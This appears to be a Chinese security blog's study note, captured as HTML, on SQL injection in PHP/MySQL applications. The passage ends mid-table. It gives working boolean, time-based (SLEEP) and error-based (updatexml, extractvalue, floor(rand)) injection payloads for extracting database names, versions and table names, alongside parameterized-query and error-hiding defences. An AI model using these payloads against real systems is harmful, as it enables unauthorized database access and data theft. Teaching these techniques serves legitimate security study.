@@ -1,0 +1,718 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>044-WEB攻防-PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式 | 0xMouise</title><meta name="author" content="0xMouise"><meta name="copyright" content="0xMouise"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="044-WEB攻防-PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式1.演示案例： ➢PHP-MYSQL-SQL操作-增删改查➢PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟➢PHP-MYSQL-注入条件-数据回显&amp;错误处理➢PHP-MYSQL-CMS案例-插入报错&amp;删除延迟  2. 核心知识点概览本文围绕">
+<meta property="og:type" content="article">
+<meta property="og:title" content="044-WEB攻防-PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式">
+<meta property="og:url" content="https://0xmouise.github.io/2025/09/16/044-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&SQL%E7%9B%B2%E6%B3%A8&%E5%B8%83%E5%B0%94%E5%9B%9E%E6%98%BE&%E5%BB%B6%E6%97%B6%E5%88%A4%E6%96%AD&%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86&%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:site_name" content="0xMouise">
+<meta property="og:description" content="044-WEB攻防-PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式1.演示案例： ➢PHP-MYSQL-SQL操作-增删改查➢PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟➢PHP-MYSQL-注入条件-数据回显&amp;错误处理➢PHP-MYSQL-CMS案例-插入报错&amp;删除延迟  2. 核心知识点概览本文围绕">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5ff9rxengj31hc0xc1kx.jpg">
+<meta property="article:published_time" content="2025-09-16T04:48:44.000Z">
+<meta property="article:modified_time" content="2025-09-16T07:48:52.000Z">
+<meta property="article:author" content="0xMouise">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5ff9rxengj31hc0xc1kx.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "044-WEB攻防-PHP应用&SQL盲注&布尔回显&延时判断&报错处理&增删改查方式",
+  "url": "https://0xmouise.github.io/2025/09/16/044-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&SQL%E7%9B%B2%E6%B3%A8&%E5%B8%83%E5%B0%94%E5%9B%9E%E6%98%BE&%E5%BB%B6%E6%97%B6%E5%88%A4%E6%96%AD&%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86&%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%96%B9%E5%BC%8F/",
+  "image": "https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5ff9rxengj31hc0xc1kx.jpg",
+  "datePublished": "2025-09-16T04:48:44.000Z",
+  "dateModified": "2025-09-16T07:48:52.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "0xMouise",
+      "url": "https://0xMouise.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmxlm4j30u00u9wk1.jpg"><link rel="canonical" href="https://0xmouise.github.io/2025/09/16/044-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&amp;SQL%E7%9B%B2%E6%B3%A8&amp;%E5%B8%83%E5%B0%94%E5%9B%9E%E6%98%BE&amp;%E5%BB%B6%E6%97%B6%E5%88%A4%E6%96%AD&amp;%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86&amp;%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%96%B9%E5%BC%8F/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '044-WEB攻防-PHP应用&SQL盲注&布尔回显&延时判断&报错处理&增删改查方式',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmwmxmj31hc0u07wh.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmxlm4j30u00u9wk1.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">105</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5ff9rxengj31hc0xc1kx.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">0xMouise</span></a><a class="nav-page-title" href="/"><span class="site-name">044-WEB攻防-PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">044-WEB攻防-PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-16T04:48:44.000Z" title="发表于 2025-09-16 12:48:44">2025-09-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-16T07:48:52.000Z" title="更新于 2025-09-16 15:48:52">2025-09-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">小迪学习笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="044-WEB攻防-PHP应用-SQL盲注-布尔回显-延时判断-报错处理-增删改查方式"><a href="#044-WEB攻防-PHP应用-SQL盲注-布尔回显-延时判断-报错处理-增删改查方式" class="headerlink" title="044-WEB攻防-PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式"></a>044-WEB攻防-PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式</h1><h2 id="1-演示案例："><a href="#1-演示案例：" class="headerlink" title="1.演示案例："></a>1.演示案例：</h2><blockquote>
+<p><strong>➢PHP-MYSQL-SQL操作-增删改查<br>➢PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟<br>➢PHP-MYSQL-注入条件-数据回显&amp;错误处理<br>➢PHP-MYSQL-CMS案例-插入报错&amp;删除延迟</strong></p>
+</blockquote>
+<h2 id="2-核心知识点概览"><a href="#2-核心知识点概览" class="headerlink" title="2. 核心知识点概览"></a>2. 核心知识点概览</h2><p>本文围绕 PHP 与 MySQL 交互中的 SQL 注入风险展开，核心覆盖 3 类关键内容：</p>
+<ol>
+<li><p>PHP-MySQL 的 SQL 基础操作（增删改查）及注入风险点</p>
+</li>
+<li><p>3 种 SQL 盲注技术（布尔型、时间型、报错型）的原理与实战</p>
+</li>
+<li><p>注入条件判断（数据回显、错误处理）及 CMS 实战案例（插入报错、删除延时）</p>
+</li>
+</ol>
+<h2 id="3-PHP-MySQL-SQL-基础操作（增删改查）"><a href="#3-PHP-MySQL-SQL-基础操作（增删改查）" class="headerlink" title="3. PHP-MySQL-SQL 基础操作（增删改查）"></a>3. PHP-MySQL-SQL 基础操作（增删改查）</h2><h3 id="3-1-操作定义与场景"><a href="#3-1-操作定义与场景" class="headerlink" title="3.1 操作定义与场景"></a>3.1 操作定义与场景</h3><p>SQL 注入的风险根源是 “用户输入未过滤直接拼接 SQL 语句”，需先理解 PHP 中常见的 MySQL 操作逻辑：</p>
+<table>
+<thead>
+<tr>
+<th>操作类型</th>
+<th>功能描述</th>
+<th>应用场景</th>
+<th>基础 SQL 语句</th>
+<th>注入风险点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查询（Select）</td>
+<td>从数据库读取数据</td>
+<td>文章详情、用户登录验证</td>
+<td>SELECT * FROM news WHERE id&#x3D;$id</td>
+<td>$id 未过滤，可拼接逻辑判断</td>
+</tr>
+<tr>
+<td>新增（Insert）</td>
+<td>向数据库插入数据</td>
+<td>留言提交、用户注册</td>
+<td>INSERT INTO news (title) VALUES (‘$title’)</td>
+<td>$title 含单引号 &#x2F; 特殊字符，破坏 SQL 结构</td>
+</tr>
+<tr>
+<td>删除（Delete）</td>
+<td>从数据库删除数据</td>
+<td>删除文章、删除用户</td>
+<td>DELETE FROM news WHERE id&#x3D;$id</td>
+<td>$id 拼接or 1&#x3D;1可删除所有数据</td>
+</tr>
+<tr>
+<td>修改（Update）</td>
+<td>更新数据库中已有数据</td>
+<td>修改密码、编辑文章</td>
+<td>UPDATE user SET pwd&#x3D;’$new_pwd’ WHERE id&#x3D;$id</td>
+<td>(new_pwd或)id 未过滤，可篡改更新条件</td>
+</tr>
+</tbody></table>
+<h3 id="3-2-补充：PHP-代码示例（风险版-vs-安全版）"><a href="#3-2-补充：PHP-代码示例（风险版-vs-安全版）" class="headerlink" title="3.2 补充：PHP 代码示例（风险版 vs 安全版）"></a>3.2 补充：PHP 代码示例（风险版 vs 安全版）</h3><h4 id="风险版（存在注入）"><a href="#风险版（存在注入）" class="headerlink" title="风险版（存在注入）"></a>风险版（存在注入）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 直接拼接用户输入，无过滤</span><br><span class="line">$id = $_GET[&#x27;id&#x27;]; // 用户输入：1&#x27; or 1=1 --</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id=$id&quot;; </span><br><span class="line">$result = mysql_query($sql); // 执行后变成：SELECT * FROM news WHERE id=1&#x27; or 1=1 --</span><br></pre></td></tr></table></figure>
+
+<h4 id="安全版（参数化查询）"><a href="#安全版（参数化查询）" class="headerlink" title="安全版（参数化查询）"></a>安全版（参数化查询）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 使用MySQLi参数化查询，避免注入</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM news WHERE id=?&quot;); </span><br><span class="line">$stmt-&gt;bind_param(&quot;i&quot;, $id); // 绑定参数（i=整数类型）</span><br><span class="line">$stmt-&gt;execute();</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-三种-SQL-盲注技术详解"><a href="#4-三种-SQL-盲注技术详解" class="headerlink" title="4. 三种 SQL 盲注技术详解"></a>4. 三种 SQL 盲注技术详解</h2><h3 id="什么是盲注？"><a href="#什么是盲注？" class="headerlink" title="什么是盲注？"></a>什么是盲注？</h3><p>当注入时<strong>无法直接从页面获取数据库数据回显</strong>（如页面只显示 “成功 &#x2F; 失败”“加载中”，无具体内容），需通过 “逻辑判断” 或 “错误触发” 间接获取数据的注入方式，称为盲注。</p>
+<h3 id="4-1-基于布尔的-SQL-盲注（需页面回显变化）"><a href="#4-1-基于布尔的-SQL-盲注（需页面回显变化）" class="headerlink" title="4.1 基于布尔的 SQL 盲注（需页面回显变化）"></a>4.1 基于布尔的 SQL 盲注（需页面回显变化）</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>利用 SQL 的逻辑判断（and&#x2F;or），构造条件语句，通过<strong>页面是否正常显示</strong>（如 “存在数据” vs “空白页”）判断条件是否成立，逐步猜解数据。</p>
+<h4 id="核心函数（含详细解释-示例）"><a href="#核心函数（含详细解释-示例）" class="headerlink" title="核心函数（含详细解释 + 示例）"></a>核心函数（含详细解释 + 示例）</h4><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>示例（猜解数据库名）</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>length()</td>
+<td>计算字符串长度</td>
+<td>and length(database())&#x3D;7</td>
+<td>判断当前数据库名是否为 7 个字符</td>
+</tr>
+<tr>
+<td>left()</td>
+<td>从左截取指定长度字符</td>
+<td>and left(database(),1)&#x3D;’p’</td>
+<td>判断数据库名第 1 个字符是否为 ‘p’</td>
+</tr>
+<tr>
+<td>substr()</td>
+<td>从指定位置截取指定长度字符（substr (字符串，起始位，长度)）</td>
+<td>and substr(database(),2,1)&#x3D;’i’</td>
+<td>判断数据库名第 2 个字符是否为 ‘i’</td>
+</tr>
+<tr>
+<td>ord()</td>
+<td>将字符转为 ASCII 码值</td>
+<td>and ord(left(database(),1))&#x3D;112</td>
+<td>‘p’ 的 ASCII 码是 112，判断第 1 个字符是否为 ‘p’</td>
+</tr>
+<tr>
+<td>regexp</td>
+<td>正则匹配</td>
+<td>and database() regexp ‘^p’</td>
+<td>判断数据库名是否以 ‘p’ 开头</td>
+</tr>
+<tr>
+<td>like</td>
+<td>模糊匹配（% 匹配任意字符，_匹配单个字符）</td>
+<td>and database() like ‘p%’</td>
+<td>判断数据库名是否以 ‘p’ 开头</td>
+</tr>
+</tbody></table>
+<h4 id="注入步骤（实战示例）"><a href="#注入步骤（实战示例）" class="headerlink" title="注入步骤（实战示例）"></a>注入步骤（实战示例）</h4><ol>
+<li><p><strong>判断注入点</strong>：访问<a target="_blank" rel="noopener" href="http://xxx/news.php?id=1">http://xxx/news.php?id=1</a> and 1&#x3D;1（页面正常），id&#x3D;1 and 1&#x3D;2（页面空白）→ 存在布尔盲注点。</p>
+</li>
+<li><p><strong>猜解数据库名长度</strong>：尝试id&#x3D;1 and length(database())&#x3D;6（页面正常）→ 数据库名长度为 6。</p>
+</li>
+<li><p><strong>逐字符猜解数据库名</strong>：</p>
+</li>
+</ol>
+<ul>
+<li><ul>
+<li>id&#x3D;1 and ord(left(database(),1))&gt;110（正常，说明第 1 个字符 ASCII&gt;110）</li>
+</ul>
+</li>
+<li><ul>
+<li>id&#x3D;1 and ord(left(database(),1))&lt;113（正常，说明 &lt; 113）</li>
+</ul>
+</li>
+<li><ul>
+<li>id&#x3D;1 and ord(left(database(),1))&#x3D;112（正常，ASCII&#x3D;112→’p’）</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><strong>后续猜解表名、列名、数据</strong>：重复上述逻辑，如and ord(left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;117（猜解第一个表名第 1 个字符是否为 ‘u’）。</li>
+</ol>
+<h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p>页面有明确的 “正常 &#x2F; 异常” 回显（如正确 ID 显示内容，错误 ID 显示空白），无错误提示。</p>
+<h3 id="4-2-基于时间的-SQL-盲注（无需回显-报错）"><a href="#4-2-基于时间的-SQL-盲注（无需回显-报错）" class="headerlink" title="4.2 基于时间的 SQL 盲注（无需回显 &#x2F; 报错）"></a>4.2 基于时间的 SQL 盲注（无需回显 &#x2F; 报错）</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>利用SLEEP()函数构造条件，若条件成立则触发延迟（如 3 秒），通过<strong>页面响应时间</strong>判断条件是否成立，适合无任何回显的场景。</p>
+<h4 id="核心函数"><a href="#核心函数" class="headerlink" title="核心函数"></a>核心函数</h4><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>示例</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IF(条件, 成立执行, 不成立执行)</td>
+<td>条件判断函数</td>
+<td>IF(1&#x3D;1, SLEEP(3), 0)</td>
+<td>1&#x3D;1 成立，执行延迟 3 秒</td>
+</tr>
+<tr>
+<td>SLEEP(N)</td>
+<td>使 SQL 执行暂停 N 秒</td>
+<td>SLEEP(5)</td>
+<td>暂停 5 秒，用于观察延迟</td>
+</tr>
+</tbody></table>
+<h4 id="注入语句（带说明）"><a href="#注入语句（带说明）" class="headerlink" title="注入语句（带说明）"></a>注入语句（带说明）</h4><ol>
+<li><p><strong>验证注入点</strong>：id&#x3D;1 and sleep(3) → 页面延迟 3 秒加载→存在时间盲注点。</p>
+</li>
+<li><p><strong>猜解数据库名长度</strong>：id&#x3D;1 and if(length(database())&#x3D;6, sleep(3), 0) → 若延迟 3 秒→长度为 6。</p>
+</li>
+<li><p><strong>逐字符猜解</strong>：id&#x3D;1 and if(ord(left(database(),1))&#x3D;112, sleep(3), 0) → 若延迟→第 1 个字符为 ‘p’。</p>
+</li>
+</ol>
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
+<li><p>网络波动可能影响延迟判断，建议多次测试。</p>
+</li>
+<li><p>部分数据库（如 PostgreSQL）用pg_sleep(N)替代SLEEP(N)。</p>
+</li>
+</ul>
+<h4 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h4><p>页面无任何回显（无论输入正确与否，页面显示一致），且无错误提示。</p>
+<h3 id="4-3-基于报错的-SQL-盲注（需开启错误显示）"><a href="#4-3-基于报错的-SQL-盲注（需开启错误显示）" class="headerlink" title="4.3 基于报错的 SQL 盲注（需开启错误显示）"></a>4.3 基于报错的 SQL 盲注（需开启错误显示）</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>利用 MySQL 函数（如updatexml()、extractvalue()）的语法特性，构造非法参数触发报错，使<strong>错误信息中携带数据库数据</strong>（如版本、表名）。</p>
+<h4 id="核心函数（报错原理-示例）"><a href="#核心函数（报错原理-示例）" class="headerlink" title="核心函数（报错原理 + 示例）"></a>核心函数（报错原理 + 示例）</h4><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>报错原理</th>
+<th>注入语句（获取数据库版本）</th>
+<th>报错信息（含数据）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>updatexml(目标XML, XPath路径, 替换值)</td>
+<td>XPath 路径需符合 XML 语法，若含特殊字符（如～）则报错</td>
+<td>and updatexml(1, concat(0x7e, (select version()), 0x7e), 1)</td>
+<td>XPATH syntax error: ‘<del>5.7.26</del>‘（5.7.26 是数据库版本）</td>
+</tr>
+<tr>
+<td>extractvalue(目标XML, XPath路径)</td>
+<td>同 updatexml，XPath 路径非法触发报错</td>
+<td>and extractvalue(1, concat(0x5c, (select database())))</td>
+<td>XPATH syntax error: ‘\testdb’（testdb 是当前数据库名）</td>
+</tr>
+<tr>
+<td>floor(rand(0)*2)</td>
+<td>结合group by使用时，rand () 值重复导致主键冲突报错</td>
+<td>and (select count(*) from information_schema.tables group by floor(rand(0)*2) concat(0x7e, database(), 0x7e))</td>
+<td>Duplicate entry ‘<del>testdb</del>1’ for key ‘group_key’</td>
+</tr>
+</tbody></table>
+<h4 id="注入步骤（以-updatexml-为例）"><a href="#注入步骤（以-updatexml-为例）" class="headerlink" title="注入步骤（以 updatexml 为例）"></a>注入步骤（以 updatexml 为例）</h4><p><strong>判断是否开启错误显示</strong>：访问<a target="_blank" rel="noopener" href="http://xxx/news.php?id=1">http://xxx/news.php?id=1</a>‘ → 若显示 SQL 语法错误→开启了错误显示。</p>
+<p><strong>构造报错语句</strong>：id&#x3D;1’ and updatexml(1, concat(0x7e, (select version()), 0x7e), 1)–  → 从报错中获取版本。</p>
+<p><strong>获取更多数据</strong>：替换select version()为select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 → 获取第一个表名。</p>
+<h4 id="适用场景-2"><a href="#适用场景-2" class="headerlink" title="适用场景"></a>适用场景</h4><p>PHP 开启了display_errors&#x3D;On（显示 SQL 错误信息），适合快速获取数据（比布尔 &#x2F; 时间盲注效率高）。</p>
+<h4 id="补充：如何关闭错误显示（防御）"><a href="#补充：如何关闭错误显示（防御）" class="headerlink" title="补充：如何关闭错误显示（防御）"></a>补充：如何关闭错误显示（防御）</h4><p>在 PHP 配置文件php.ini中设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">display_errors = Off</span><br><span class="line">error_log = /var/log/php_error.log # 错误日志写入文件，不对外显示</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-4-三种盲注对比（表格优化）"><a href="#4-4-三种盲注对比（表格优化）" class="headerlink" title="4.4 三种盲注对比（表格优化）"></a>4.4 三种盲注对比（表格优化）</h3><table>
+<thead>
+<tr>
+<th>盲注类型</th>
+<th>核心依赖</th>
+<th>优点</th>
+<th>缺点</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>布尔型</td>
+<td>页面回显变化（正常 &#x2F; 异常）</td>
+<td>逻辑清晰，易判断</td>
+<td>需逐字符猜解，效率低</td>
+<td>页面有明确回显差异，无错误显示</td>
+</tr>
+<tr>
+<td>时间型</td>
+<td>页面响应延迟</td>
+<td>无需回显 &#x2F; 报错，适用广</td>
+<td>受网络影响大，效率最低</td>
+<td>页面无任何回显和错误提示</td>
+</tr>
+<tr>
+<td>报错型</td>
+<td>SQL 错误信息显示</td>
+<td>效率高，直接带数据</td>
+<td>需开启错误显示，局限性大</td>
+<td>PHP 开启 display_errors，需快速获取数据</td>
+</tr>
